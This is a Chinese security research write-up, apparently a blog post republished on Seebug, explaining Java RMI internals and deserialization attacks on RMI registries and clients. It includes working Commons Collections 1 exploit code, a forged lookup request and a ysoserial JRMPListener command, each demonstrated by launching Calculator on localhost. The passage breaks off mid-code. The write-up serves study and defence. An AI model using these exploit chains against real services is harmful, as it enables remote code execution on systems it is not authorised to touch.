**作者：p1g3@D0g3**  
**原文链接:<https://payloads.info/>**  
**本文为作者投稿，Seebug Paper 期待你的分享，凡经采用即有礼品相送！**  
**投稿邮箱：paper@seebug.org**

这一周把时间都花在学习RMI上了...在很多位师傅的帮助下，终于搞懂了RMI是个什么东西，他的攻击流程是怎么样的，遂记录一篇笔记。

# RMI是什么?

RMI（Remote Method Invocation），是一种跨JVM实现方法调用的技术。

在RMI的通信方式中，由以下三个大部分组成：

  * Client
  * Registry
  * Server

其中Client是客户端，Server是服务端，而Registry是注册中心。

客户端会Registry取得服务端注册的服务，从而调用服务端的远程方法。

注册中心在RMI通信中起到了一个什么样的作用？我们可以把他理解成一个字典，一个负责网络传输的模块。

服务端在注册中心注册服务时，需要提供一个key以及一个value，这个value是一个远程对象，Registry会对这个远程对象进行封装，使其转为一个远程代理对象。当客户端想要调用远程对象的方法时，则需要先通过Registry获取到这个远程代理对象，使用远程代理对象与服务端开放的端口进行通信，从而取得调用方法的结果。

RMI我认为实际上更偏向于面向接口编程，客户端不需要具体的接口实现类，只需要接口实现的代码，就可以调用远程服务端中实现了这个接口具体类的方法。

强烈建议在学习RMI之前，先看看B站马士兵的这个视频来了解RPC的演练过程，以及底层的原理：[https://www.bilibili.com/video/BV1zE41147Zq?from=search&seid=13740626242455157002](https://www.bilibili.com/video/BV1zE41147Zq?from=search&seid=13740626242455157002)

# RMI的通信原理

在低版本的JDK中，Server与Registry是可以不在一台服务器上的，而在高版本的JDK中，Server与Registry只能在一台服务器上，否则无法注册成功。

## 测试源码 & JDK版本

  * JDK 7u80

### Client

Client用来调用远程方法，由于需要调用具体方法，所以本地需要有服务端注册的远程对象类所实现的接口。

User.java

    
    
    import java.rmi.RemoteException;
    
    public interface User extends java.rmi.Remote {
        ublic String getName() throws RemoteException;;
        public User getUser() throws RemoteException;
        public void updateName(String name) throws RemoteException;;
    }

接口需要继承java.rmi.Remote接口，这是一个空接口，和Serializable接口一样，只作标记作用，接口中的每个方法都需要抛出RemoteException异常。

Client.java

    
    
    import java.rmi.registry.LocateRegistry;
    import java.rmi.registry.Registry;
    
    
    public class Client {
    
        public static void main(String[] args) throws Exception {
    
            Registry registry = LocateRegistry.getRegistry("127.0.0.1",8888);
            registry.lookup("user");
        }
    }

Client与注册中心和服务端交互。

### Server

User.java

    
    
    import java.rmi.RemoteException;
    
    public interface User extends java.rmi.Remote {
        public String getName() throws RemoteException;;
        public User getUser() throws RemoteException;
        public void updateName(String name) throws RemoteException;;
    }

同样的，Server中也需要有一个User接口。

LocalUser.java

    
    
    import java.io.Serializable;
    import java.rmi.RemoteException;
    import java.rmi.server.UnicastRemoteObject;
    
    public class LocalUser extends UnicastRemoteObject implements User  {
        public String name;
        public int age;
    
        public LocalUser(String name, int age) throws RemoteException {
            super();
            this.name = name;
            this.age = age;
        }
    
        public User getUser(){
            return this;
        }
    
        public String getName(){
            return "["+this.name+"]";
        }
    
        public void updateName(String name){
            this.name = name;
        }
    }

LocalUser实现了User接口，其需要继承UnicastRemoteObject类。

Server.java

    
    
    import java.rmi.AlreadyBoundException;
    import java.rmi.NotBoundException;
    import java.rmi.RemoteException;
    import java.rmi.registry.LocateRegistry;
    import java.rmi.registry.Registry;
    import java.util.concurrent.CountDownLatch;
    
    public class Server {
        public static void main(String[] args) throws RemoteException, AlreadyBoundException, InterruptedException, NotBoundException {
            User liming = new LocalUser("liming",15);
    
            Registry registry = LocateRegistry.createRegistry(8888);
            registry.bind("user",liming);
    
            System.out.println("registry is running...");
    
            System.out.println("liming is bind in registry");
    
            CountDownLatch latch=new CountDownLatch(1);
    
            latch.await();
        }
    
    }

Server.java负责将远程对象绑定至注册中心。

### Registry

上面的Server里其实已经包含Registry了，上面的是大多数人的写法，当然如果注册中心和Server不写在一个文件里的话，我们还可以单独写一个创建注册中心的文件。

Registry.java

    
    
    import java.rmi.AlreadyBoundException;
    import java.rmi.NotBoundException;
    import java.rmi.RemoteException;
    import java.rmi.registry.LocateRegistry;
    import java.rmi.registry.Registry;
    import java.util.concurrent.CountDownLatch;
    
    public class Registry {
        public static void main(String[] args) throws RemoteException, AlreadyBoundException, InterruptedException, NotBoundException {
            Registry registry = LocateRegistry.createRegistry(8888);
    
            System.out.println("registry is running...");
    
            CountDownLatch latch=new CountDownLatch(1);
    
            latch.await();
        }
    
    }

或者我们还可以使用bin目录下的rmiregistry来创建注册中心：

![-w562](https://images.seebug.org/content/images/2020/06/22/1592803975000-1uvzbm.png-w331s)

用法：rmiregistry port

### 调用

在这里写一下如何在客户端调用服务端的远程方法，首先编译并运行Server.java：

![-w634](https://images.seebug.org/content/images/2020/06/22/1592803975000-2irzfb.png-w331s)

接着运行客户端，即可调用远程方法：

![-w1401](https://images.seebug.org/content/images/2020/06/22/1592803975000-3kblss.png-w331s)

## 流程图

![](https://images.seebug.org/content/images/2020/06/22/1592803976000-4ebjek.png-w331s)

上面一张图是我自己画的，可能不太完善，具体可以看先知中这个师傅里边用的流程图：

![](https://images.seebug.org/content/images/2020/06/22/1592803976000-5xjsli.png-w331s)

上图来源：https://xz.aliyun.com/t/2223

# 源码分析

## 客户端或服务端与注册中心的通信

获取注册中心有两种方式，一种是创建时获取（LocateRegistry#createRegistry），另外一种则是远程获取（LocateRegistry#getRegistry）。接下来会分析这两种方式的异同。

### 本地获取注册中心

createRegistry有两个方法，其中传递的参数不同：

![-w1067](https://images.seebug.org/content/images/2020/06/22/1592803976000-6usyel.png-w331s)

第一种只需要传递port，即注册中心监听的端口，第二种方式除了需要传递port外，还需要传递RMIClientSocketFactory以及RMIServerSocketFactory对象。

两个方法最终获取到的都是RegistryImpl对象，对于攻击者的我们关系并不大，只需要分析第一种方法即可。

    
    
        public static Registry createRegistry(int var0) throws RemoteException {
            return new RegistryImpl(var0);
        }

var0即我们传递的port，这里new了一个RegistryImpl对象，跟入：

    
    
        public RegistryImpl(int var1) throws RemoteException {
            LiveRef var2 = new LiveRef(id, var1);
            this.setup(new UnicastServerRef(var2));
        }

LiveRef里封装了一些信息，包括ip和要监听的端口等：

![-w741](https://images.seebug.org/content/images/2020/06/22/1592803977000-7zrhch.png-w331s)

第二行的setup方法中传递的参数是UnicastServerRef对象，在new的过程中把LiveRef对象传递进去了：

    
    
        public UnicastServerRef(LiveRef var1) {
            super(var1);
            this.forceStubUse = false;
            this.hashToMethod_Map = null;
        }
    
    super#UnicastRef
    
    public UnicastRef(LiveRef var1) {
        this.ref = var1;
    }

在这里也只是做了一些数据的封装，并没有涉及到网络请求，我们就行跟RegistryImpl#setup：

![-w879](https://images.seebug.org/content/images/2020/06/22/1592803977000-8rqdyf.png-w331s)

跟入UnicastServerRef#exportObject：

![-w911](https://images.seebug.org/content/images/2020/06/22/1592803977000-9gimjg.png-w331s)

这里调用了Util.createProxy，传入了RegistryImpl.class、Ref以及一个不知道是干嘛用的参数：

![-w960](https://images.seebug.org/content/images/2020/06/22/1592803977000-10ztutg.png-w331s)

接着跟CreateStub：

![-w1070](https://images.seebug.org/content/images/2020/06/22/1592803977000-11mwvkh.png-w331s)

在这里返回了RegistryImpl_Stub对象，所以var 5实际上是RegistryImpl_Stub对象。

回到上边的setSkeleton：

![-w979](https://images.seebug.org/content/images/2020/06/22/1592803977000-12jqdxe.png-w331s)

同样的，这里也会通过一样的方式来获取RegistryImpl_Skel对象：

![-w1031](https://images.seebug.org/content/images/2020/06/22/1592803978000-13djimk.png-w331s)

继续回到上边，再创建完Stub和Skel对象时，会实例化一个Target对象：

![-w1095](https://images.seebug.org/content/images/2020/06/22/1592803978000-14mdxom.png-w331s)

var
6实际上也只是初始化了一些信息，把上面获取到的Stub、Skel对象以及一些ip端口信息封装在一个对象里边，之后会调用LiveRef#exportObject，并且将Target对象传进去，接着会来好几个exportObject，调用栈如下：

![-w359](https://images.seebug.org/content/images/2020/06/22/1592803978000-15nggmv.png-w331s)

到了TCPTransport#exportObject之后，会做一系列网络层的操作，包括监听端口、设置当遇到请求时该怎么做：

![-w749](https://images.seebug.org/content/images/2020/06/22/1592803978000-16wlkwh.png-w331s)

跟入listen方法：

![-w1037](https://images.seebug.org/content/images/2020/06/22/1592803978000-17whggw.png-w331s)

在调用TCPEndpoint#newServerSocket时，会开启端口监听：

![-w727](https://images.seebug.org/content/images/2020/06/22/1592803978000-18tvgol.png-w331s)

接着会设置AcceptLoop线程，此时会触发其run方法：

![-w574](https://images.seebug.org/content/images/2020/06/22/1592803978000-19kksvy.png-w331s)

跟入TCPTransport#executeAcceptLoop：

![-w942](https://images.seebug.org/content/images/2020/06/22/1592803978000-20btygo.png-w331s)

这里会获取到请求的一些相关信息，比如Host之类，之后在下边会创建一个线程调用ConnectionHandler来处理请求：

![-w891](https://images.seebug.org/content/images/2020/06/22/1592803979000-21jklax.png-w331s)

跟入ConnectionHandler#run：

![-w1011](https://images.seebug.org/content/images/2020/06/22/1592803979000-22ohpho.png-w331s)

这里的var2就是上边传进来的ServerSocket对象，接着跟入run0方法：

在上边会获取一些客户端发来的信息，下边会调用TCPTransport#handleMessages来处理请求：

![-w1016](https://images.seebug.org/content/images/2020/06/22/1592803979000-23txwjs.png-w331s)

跟入handlerMessages：

![-w787](https://images.seebug.org/content/images/2020/06/22/1592803979000-24zlrds.png-w331s)

上面还是获取客户端传来的数据，我们这里直接看下边：

![-w702](https://images.seebug.org/content/images/2020/06/22/1592803979000-25hbzvp.png-w331s)

这里只需要关注80，因为客户端发送数据的时候这里发的是80，具体后边会说。

在上面的代码中先是创建了一个StreamRemoteCall对象，并传入var1，var1是当前连接的Connection对象，接着跟入TCPTransport#serviceCall：

![-w714](https://images.seebug.org/content/images/2020/06/22/1592803979000-26lfzmb.png-w331s)

在上边获取了传来的一些信息，比如ObjID，接着会获取Target对象，在下边会调用UnicastServerRef#dispatch来处理请求：

![-w833](https://images.seebug.org/content/images/2020/06/22/1592803979000-27durlf.png-w331s)

这里传递了两个参数，一个是Remote对象，一个是当前连接的StreamRemoteCall对象，接着跟dispatch：

![-w886](https://images.seebug.org/content/images/2020/06/22/1592803980000-28qzbay.png-w331s)

前面也是读一些数据，接着会调用到UnicastServerRef#oldDispatch：

![-w829](https://images.seebug.org/content/images/2020/06/22/1592803980000-29wmyte.png-w331s)

最后一行调用了this.skel.dispatch，此时的this.skel为刚刚创建的RegistryImpl_Skel对象，接着跟其dispatch方法：

![-w964](https://images.seebug.org/content/images/2020/06/22/1592803980000-30glhge.png-w331s)

在这里就是真正处理请求的核心了，var3是传递过来的int类型的参数，在这里有如下关系的对应：

  * 0->bind
  * 1->list
  * 2->lookup
  * 3->rebind
  * 4->unbind

在这里会对每个调用的方法进行处理，比如你调用了bind方法，就会先readObject反序列化你传过来的序列化对象，之后再调用var6.bind来注册服务，此时的var6位RegistryImpl对象，这个对象其实就是调用createRegistry获得的，这里说这个的目的是想让大家知道，其实无论是客户端还是服务端，最终其调用注册中心的方法都是通过对创建的RegistryImpl对象进行调用。

在上面那部分，我们已经分析完了当注册中心监听的端口被请求时，是如何处理这些请求的。

通过createRegistry返回的是RegistryImpl对象，最终是像这样的：

![-w1029](https://images.seebug.org/content/images/2020/06/22/1592803980000-31sabak.png-w331s)

这里的bindings是一个Hashtable，里边以键-值的方式存储了服务端注册的服务。

### 远程获取注册中心

通过getRegistry方法获得的对象是RegistryImpl_Stub对象，与通过createRegistry获得的对象不同，createRegistry获得的微RegistryImpl对象。

当我们调用这两者的方法时，其对应的处理方式也十分不同，以bind方法举例，通过createRegistry获得的注册中心调用bind方法十分简单：

![-w885](https://images.seebug.org/content/images/2020/06/22/1592803980000-32ptphj.png-w331s)

在第一步会checkAccess，里边有一些判断，会对你当前的权限、来源IP进行判断，之前说了，高版本JDK中不允许除了localhost之外的地址注册服务也是在这里进行判断的：

![-w981](https://images.seebug.org/content/images/2020/06/22/1592803980000-33akjig.png-w331s)

之后其实很简单了，只是这个键是否已经被绑定过，如果已经被绑定过，则抛出一个AlreadyBoundException的错误，反之则将键和对象都put到Hashtable中。

而如果是远程调用bind方法呢？那将会变得十分麻烦，测试代码：

    
    
    User liming = new LocalUser("liming",15);
    Registry registry = LocateRegistry.createRegistry(8888);
    Registry reg = LocateRegistry.getRegistry("127.0.0.1",8888);
    reg.bind("user",liming);

这里我先创建了注册中心，之后通过getRegistry的方式远程获取注册中心，此时获得到的对象为RegistryImpl_Stub，跟入其bind方法：

![-w920](https://images.seebug.org/content/images/2020/06/22/1592803981000-34avpyz.png-w331s)

这里会先调用UnicastRef#newCall：

![-w1003](https://images.seebug.org/content/images/2020/06/22/1592803981000-35wasrp.png-w331s)

注意这里的var3，前面说过，bind方法对于的数字为0，此时的var3就代表了bind方法对应的数字。

在newConnection这里，会写入一些已经约定好的数据，比如ip、端口等，在StreamRemoteCall里，同样会写入一些数据：

![-w812](https://images.seebug.org/content/images/2020/06/22/1592803981000-36tkzll.png-w331s)

这里在最开始写入了80，也就和我们上边分析时说的80对上了，然后还会写一些数据比如要调用的方法所对应的num和ObjID之类的。

当调用完这些之后，回到bind方法：

![-w947](https://images.seebug.org/content/images/2020/06/22/1592803981000-37juzdq.png-w331s)

此时会往写入两个内容：

  * 序列化后的var1，var1为我们要绑定远程对象对应的名称
  * 序列化后的var2，var2为我们要绑定的远程对象

在invoke这里会把请求发出去，接着我们看看注册中心在收到这条请求后是如何进行处理的，前面说了会调用Skel#dispatch来处理请求，我们直接看这个就可以了。

![-w857](https://images.seebug.org/content/images/2020/06/22/1592803981000-38zkehn.png-w331s)

注册中心首先会read两个Object，第一个即我们刚刚write进去的字符串对象，第二个就是远程对象了，接着调用var6.bind来绑定服务，var6即RegistryImpl对象，他是如何绑定服务的在上边写了。

至此，我们已经了解了当注册中心的方法被调用时，远程获取和本地获取的差异是什么。

## 客户端与服务端的通信

客户端与服务端的通信只发生在调用远程方法时。此时是客户端的远程代理对象与的Skel进行通信。

我们在客户端获取的是注册中心封装好的代理对象，所以默认会调用代理对象的invoke方法：

![-w888](https://images.seebug.org/content/images/2020/06/22/1592803981000-39botgs.png-w331s)

在这里会判断你调用的方法是所有对象都有的，还是只有远程对象才有的，如果是前者，则进入invokeObjectMethod中，后者则进入invokeRemoteMethod中。

跟入RemoteObjectInvocationHandle#invokeRemoteMethod中：

![-w810](https://images.seebug.org/content/images/2020/06/22/1592803982000-40qdzgb.png-w331s)

在这里会调用this.ref.invoke，并把proxy、method、args以及method的hash传过去，this.ref是在lookup时获取到的远程对象绑定的一些端口信息：

![-w627](https://images.seebug.org/content/images/2020/06/22/1592803982000-41taeig.png-w331s)

这里的端口是随机的，每次都会变，接着跟一下LiveRef#invoke：

![-w799](https://images.seebug.org/content/images/2020/06/22/1592803982000-42xvapa.png-w331s)

同样的，在newConnection这里会发送一些约定好了的数据。

接着往下看：

![-w832](https://images.seebug.org/content/images/2020/06/22/1592803982000-43coihl.png-w331s)

在marshaValue这里，会将我们调用的方法要传递的参数序列化写到连接中，如果传递的参数是对象，就会写入序列化对象到这里：

![-w756](https://images.seebug.org/content/images/2020/06/22/1592803982000-44pcewa.png-w331s)

接着会调用StreamRemoteCall#executeCall：

![-w740](https://images.seebug.org/content/images/2020/06/22/1592803982000-45ceebj.png-w331s)

跟入：

![-w836](https://images.seebug.org/content/images/2020/06/22/1592803982000-46eobyi.png-w331s)

在this.releaseOutputStream方法中，会读取服务端执行的结果：

![-w666](https://images.seebug.org/content/images/2020/06/22/1592803983000-47rzbvz.png-w331s)

在this.out.flush时，会把之前写进去的数据发出去，服务端会返回执行结果：

![-w957](https://images.seebug.org/content/images/2020/06/22/1592803983000-48ixnfh.png-w331s)

在调用完executeCall后，会进入下边这个方法，把数据取出来：

![-w697](https://images.seebug.org/content/images/2020/06/22/1592803983000-49xcecb.png-w331s)

调用了unmarsharValue方法，把数据取出来，用的是jdk自带的readObject：

![-w886](https://images.seebug.org/content/images/2020/06/22/1592803983000-50dmmjj.png-w331s)

至此，客户端是如何和服务端通信的我们清楚了，那么服务端又是如何与客户端通信的呢？

当Client在与Server通信时，Server实际处理请求的位置在：UnicastServerRef#dispatch

![-w919](https://images.seebug.org/content/images/2020/06/22/1592803983000-51umzlj.png-w331s)

在这里会调用unmarshaValue，对请求传来的参数进行处理：

![-w585](https://images.seebug.org/content/images/2020/06/22/1592803983000-52hewat.png-w331s)

![-w874](https://images.seebug.org/content/images/2020/06/22/1592803984000-53ppnxn.png-w331s)

在这里会判断参数的数据类型，如果是Object的话，则会反序列化，所以在这里我们如果能够找到Server注册的远程对象中，如果某个方法传递的参数类型是Object，在服务端这里会被反序列化，此时即可造成RCE（当然得有gadget）。

![-w671](https://images.seebug.org/content/images/2020/06/22/1592803984000-54kwyjh.png-w331s)

最终通过调用invoke，来调用远程对象的方法。

# Java-RMI-反序列化攻击方式汇总

上面已经把客户端、服务端、注册中心三者是如何交互的给简单分析了一下，可以发现其通讯过程是基于序列化的，那么有序列化，自然就会有反序列化，所以我们只需要根据反序列化的点去攻击就好了。

## 攻击注册中心

我们可以通过以下方法与注册中心进行交互：

  * list
  * bind
  * rebind
  * rebind
  * lookup

我们来看看注册中心对这几种方法的处理，如果存在readObject，则可以利用。

### list

![-w737](https://images.seebug.org/content/images/2020/06/22/1592803984000-55ykywv.png-w331s)

当调用list时，不存在readObject，所以无法攻击注册中心。

### bind & rebind

![-w780](https://images.seebug.org/content/images/2020/06/22/1592803984000-56tixjh.png-w331s)

![-w794](https://images.seebug.org/content/images/2020/06/22/1592803984000-57uxjvh.png-w331s)

当调用bind时，会用readObject读出参数名以及远程对象，此时则可以利用。

当调用rebind时，会用readObject读出参数名和远程对象，这里和bind是一样的，所以都可以利用。

Demo：

    
    
    import org.apache.commons.collections.Transformer;
    import org.apache.commons.collections.functors.ChainedTransformer;
    import org.apache.commons.collections.functors.ConstantTransformer;
    import org.apache.commons.collections.functors.InvokerTransformer;
    
    import java.lang.reflect.Constructor;
    import java.lang.reflect.InvocationHandler;
    import java.lang.reflect.Proxy;
    import java.rmi.Remote;
    import java.rmi.registry.LocateRegistry;
    import java.rmi.registry.Registry;
    
    import java.util.HashMap;
    import java.util.Map;
    
    
    public class Client {
    
        public static void main(String[] args) throws Exception {
    
            ChainedTransformer chain = new ChainedTransformer(new Transformer[] {
                    new ConstantTransformer(Runtime.class),
                    new InvokerTransformer("getMethod", new Class[] {
                            String.class, Class[].class }, new Object[] {
                            "getRuntime", new Class[0] }),
                    new InvokerTransformer("invoke", new Class[] {
                            Object.class, Object[].class }, new Object[] {
                            null, new Object[0] }),
                    new InvokerTransformer("exec",
                            new Class[] { String.class }, new Object[]{"open  /System/Applications/Calculator.app"})});
            HashMap innermap = new HashMap();
            Class clazz = Class.forName("org.apache.commons.collections.map.LazyMap");
            Constructor[] constructors = clazz.getDeclaredConstructors();
            Constructor constructor = constructors[0];
            constructor.setAccessible(true);
            Map map = (Map)constructor.newInstance(innermap,chain);
    
    
            Constructor handler_constructor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructor(Class.class,Map.class);
            handler_constructor.setAccessible(true);
            InvocationHandler map_handler = (InvocationHandler) handler_constructor.newInstance(Override.class,map); //创建第一个代理的handler
    
            Map proxy_map = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),new Class[]{Map.class},map_handler); //创建proxy对象
    
    
            Constructor AnnotationInvocationHandler_Constructor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructor(Class.class,Map.class);
            AnnotationInvocationHandler_Constructor.setAccessible(true);
            InvocationHandler handler = (InvocationHandler)AnnotationInvocationHandler_Constructor.newInstance(Override.class,proxy_map);
    
            Registry registry = LocateRegistry.getRegistry("127.0.0.1",8888);
            Remote r = Remote.class.cast(Proxy.newProxyInstance(
                    Remote.class.getClassLoader(),
                    new Class[] { Remote.class }, handler));
            registry.bind("test",r);
    
        }
    }

这里我用的是cc1的链，所以服务端自然也需要存在cc1相关的漏洞组件才行。

重点关注：

    
    
    Remote r = Remote.class.cast(Proxy.newProxyInstance(
            Remote.class.getClassLoader(),
            new Class[] { Remote.class }, handler));

Remote.class.cast这里实际上是将一个代理对象转换为了Remote对象：

    
    
    Proxy.newProxyInstance(
                    Remote.class.getClassLoader(),
                    new Class[] { Remote.class }, handler)

上述代码中创建了一个代理对象，这个代理对象代理了Remote.class接口，handler为我们的handler对象。当调用这个代理对象的一切方法时，最终都会转到调用handler的invoke方法。

而handler是InvocationHandler对象，所以这里在反序列化时会调用InvocationHandler对象的invoke方法：

![](https://images.seebug.org/content/images/2020/06/22/1592803985000-58uehjq.png-w331s)

在invoke方法里，同样会触发memberValues的get方法，此时的memberValues是proxy_map，其也是一个代理类对象，所以会继续触发proxy_map的invoke方法，后边的就是cc1的前半段内容了。

![-w1221](https://images.seebug.org/content/images/2020/06/22/1592803985000-59dpvoh.png-w331s)

### unbind & lookup

![-w740](https://images.seebug.org/content/images/2020/06/22/1592803986000-60rrmcr.png-w331s)

![-w756](https://images.seebug.org/content/images/2020/06/22/1592803986000-61hrmtj.png-w331s)

从上述代码中我们可以发现，unbind和lookup实际上都会调用readObject来读取传递过来的参数，所以同样是可以利用的。

不过这里有一个问题，当我们调用unbind或者lookup时，只允许我们传递字符串，所以没法传递我们的恶意对象。这个问题要解决有几种办法：

  * 伪造连接请求
  * rasp hook请求代码，修改发送数据

我用的是第一种，也是比较简单的一种，直接通过反射就能实现。

想要手动伪造请求，我们就需要去判断一下当执行lookup时，会经过怎样的流程。

在调用lookup之前，我们需要先获取客户端，通过getRegistry方法返回的是一个Registry_Stub对象。

Registry_Stub#lookup

    
    
    public Remote lookup(String var1) throws AccessException, NotBoundException, RemoteException {
            try {
                RemoteCall var2 = super.ref.newCall(this, operations, 2, 4905912898345647071L);
    
                try {
                    ObjectOutput var3 = var2.getOutputStream();
                    var3.writeObject(var1);
                } catch (IOException var18) {
                    throw new MarshalException("error marshalling arguments", var18);
                }
    
                super.ref.invoke(var2);
    
                Remote var23;
                try {
                    ObjectInput var6 = var2.getInputStream();
                    var23 = (Remote)var6.readObject();
                } catch (IOException var15) {
                    throw new UnmarshalException("error unmarshalling return", var15);
                } catch (ClassNotFoundException var16) {
                    throw new UnmarshalException("error unmarshalling return", var16);
                } finally {
                    super.ref.done(var2);
                }
    
                return var23;
            } catch (RuntimeException var19) {
                throw var19;
            } catch (RemoteException var20) {
                throw var20;
            } catch (NotBoundException var21) {
                throw var21;
            } catch (Exception var22) {
                throw new UnexpectedException("undeclared checked exception", var22);
            }
        }

我们只需要照抄一遍，再修改一下代码即可。

Demo：

    
    
    import org.apache.commons.collections.Transformer;
    import org.apache.commons.collections.functors.ChainedTransformer;
    import org.apache.commons.collections.functors.ConstantTransformer;
    import org.apache.commons.collections.functors.InvokerTransformer;
    import sun.rmi.server.UnicastRef;
    
    import java.io.ObjectOutput;
    import java.lang.reflect.Constructor;
    import java.lang.reflect.Field;
    import java.lang.reflect.InvocationHandler;
    import java.lang.reflect.Proxy;
    import java.rmi.Remote;
    import java.rmi.registry.LocateRegistry;
    import java.rmi.registry.Registry;
    
    import java.rmi.server.Operation;
    import java.rmi.server.RemoteCall;
    import java.rmi.server.RemoteObject;
    import java.util.HashMap;
    import java.util.Map;
    
    
    public class Client {
    
        public static void main(String[] args) throws Exception {
    
            ChainedTransformer chain = new ChainedTransformer(new Transformer[] {
                    new ConstantTransformer(Runtime.class),
                    new InvokerTransformer("getMethod", new Class[] {
                            String.class, Class[].class }, new Object[] {
                            "getRuntime", new Class[0] }),
                    new InvokerTransformer("invoke", new Class[] {
                            Object.class, Object[].class }, new Object[] {
                            null, new Object[0] }),
                    new InvokerTransformer("exec",
                            new Class[] { String.class }, new Object[]{"open  /System/Applications/Calculator.app"})});
            HashMap innermap = new HashMap();
            Class clazz = Class.forName("org.apache.commons.collections.map.LazyMap");
            Constructor[] constructors = clazz.getDeclaredConstructors();
            Constructor constructor = constructors[0];
            constructor.setAccessible(true);
            Map map = (Map)constructor.newInstance(innermap,chain);
    
    
            Constructor handler_constructor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructor(Class.class,Map.class);
            handler_constructor.setAccessible(true);
            InvocationHandler map_handler = (InvocationHandler) handler_constructor.newInstance(Override.class,map); //创建第一个代理的handler
    
            Map proxy_map = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),new Class[]{Map.class},map_handler); //创建proxy对象
    
    
            Constructor AnnotationInvocationHandler_Constructor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructor(Class.class,Map.class);
            AnnotationInvocationHandler_Constructor.setAccessible(true);
            InvocationHandler handler = (InvocationHandler)AnnotationInvocationHandler_Constructor.newInstance(Override.class,proxy_map);
    //
            Registry registry = LocateRegistry.getRegistry("127.0.0.1",8888);
            Remote r = Remote.class.cast(Proxy.newProxyInstance(
                    Remote.class.getClassLoader(),
                    new Class[] { Remote.class }, handler));
            // 获取ref
            Field[] fields_0 = registry.getClass().getSuperclass().getSuperclass().getDeclaredFields();
            fields_0[0].setAccessible(true);
            UnicastRef ref = (UnicastRef) fields_0[0].get(registry);
    
            //获取operations
    
            Field[] fields_1 = registry.getClass().getDeclaredFields();
    
            fields_1[0].setAccessible(true);
            Operation[] operations = (Operation[]) fields_1[0].get(registry);
    
    
            // 伪造lookup的代码，去伪造传输信息
            RemoteCall var2 = ref.newCall((RemoteObject) registry, operations, 2, 4905912898345647071L);
    
            ObjectOutput var3 = var2.getOutputStream();
    
            var3.writeObject(r);
    
            ref.invoke(var2);
    
    
    
        }
    }

当然，unbind也是同样的流程，这里就不重新再写一次了。

## 攻击客户端

### 注册中心攻击客户端

PS：此方式可攻击客户端或服务端。

在通信过程中，RMI与注册中心以及服务端进行了交互，我们需要对这两者做手脚，从而达到攻击客户端的目的。

对于注册中心来说，我们还是从这几个方法触发：

  * bind
  * unbind
  * rebind
  * list
  * lookup

这里的每个方法，除了unbind和rebind，其他的都会返回数据给客户端，此时的数据是序列化的数据，所以客户端自然也会反序列化，那么我们只需要伪造注册中心的返回数据，就可以达到攻击客户端的效果啦。

这里yso的JRMPListener已经做好了，命令如下：

    
    
    java -cp ysoserial-master-30099844c6-1.jar ysoserial.exploit.JRMPListener 12345  CommonsCollections1 'open  /System/Applications/Calculator.app'

Client Demo：

    
    
    import java.rmi.registry.LocateRegistry;
    import java.rmi.registry.Registry;
    
    
    public class Client {
    
        public static void main(String[] args) throws Exception {
    
            Registry registry = LocateRegistry.getRegistry("127.0.0.1",12345);
            registry.list();
        }
    }

![-w1155](https://images.seebug.org/content/images/2020/06/22/1592803986000-62pfmcf.png-w331s)

比较有意思的是，我发现这里即使调用unbind也会触发反序列化，推测是在之前传输一些约定好的数据时进行的序列化和反序列化。

所以实际上这五种方法都可以达到注册中心反打客户端或服务端的目的。

### 服务端攻击客户端

服务端攻击客户端，大抵可以分为以下两种情景。

1.可以使用codebase 2.服务端返回参数为Object对象

先写第二种。

#### 服务端返回参数为Object对象

在RMI中，远程调用方法传递回来的不一定是一个基础数据类型（String、int），也有可能是对象，当服务端返回给客户端一个对象时，客户端就要对应的进行反序列化。

所以我们需要伪造一个服务端，当客户端调用某个远程方法时，返回的参数是我们构造好的恶意对象。

这里我还是以cc1为例，简单的演示一下。

恶意UserImpl：

    
    
    import org.apache.commons.collections.Transformer;
    import org.apache.commons.collections.functors.ChainedTransformer;
    import org.apache.commons.collections.functors.ConstantTransformer;
    import org.apache.commons.collections.functors.InvokerTransformer;
    
    import java.io.Serializable;
    import java.lang.reflect.Constructor;
    import java.lang.reflect.InvocationHandler;
    import java.lang.reflect.Proxy;
    import java.rmi.RemoteException;
    import java.rmi.server.UnicastRemoteObject;
    import java.util.HashMap;
    import java.util.Map;
    
    public class LocalUser extends UnicastRemoteObject implements User  {
        public String name;
        public int age;
    
        public LocalUser(String name, int age) throws RemoteException {
            super();
            this.name = name;
            this.age = age;
        }
    
        public Object getUser(){
    
            InvocationHandler handler = null;
            try {
                ChainedTransformer chain = new ChainedTransformer(new Transformer[]{
                        new ConstantTransformer(Runtime.class),
                        new InvokerTransformer("getMethod", new Class[]{
                                String.class, Class[].class}, new Object[]{
                                "getRuntime", new Class[0]}),
                        new InvokerTransformer("invoke", new Class[]{
                                Object.class, Object[].class}, new Object[]{
                                null, new Object[0]}),
                        new InvokerTransformer("exec",
                                new Class[]{String.class}, new Object[]{"open  /System/Applications/Calculator.app"})});
                HashMap innermap = new HashMap();
                Class clazz = Class.forName("org.apache.commons.collections.map.LazyMap");
                Constructor[] constructors = clazz.getDeclaredConstructors();
                Constructor constructor = constructors[0];
                constructor.setAccessible(true);
                Map map = (Map) constructor.newInstance(innermap, chain);
    
    
                Constructor handler_constructor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructor(Class.class, Map.class);
                handler_constructor.setAccessible(true);
                InvocationHandler map_handler = (InvocationHandler) handler_constructor.newInstance(Override.class, map); //创建第一个代理的handler
    
                Map proxy_map = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{Map.class}, map_handler); //创建proxy对象
    
    
                Constructor AnnotationInvocationHandler_Constructor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructor(Class.class, Map.class);
                AnnotationInvocationHandler_Constructor.setAccessible(true);
                handler = (InvocationHandler) AnnotationInvocationHandler_Constructor.newInstance(Override.class, proxy_map);
    
            }catch(Exception e){
                e.printStackTrace();
            }
    
            return (Object)handler;
        }
    
        public String getName(){
            return "["+this.name+"]";
        }
    
    
        public void updateName(String name){
            this.name = name;
        }
    
        public void addUser(Object user) throws RemoteException {
    
        }
    }

恶意服务端：

    
    
    import java.rmi.AlreadyBoundException;
    import java.rmi.NotBoundException;
    import java.rmi.RemoteException;
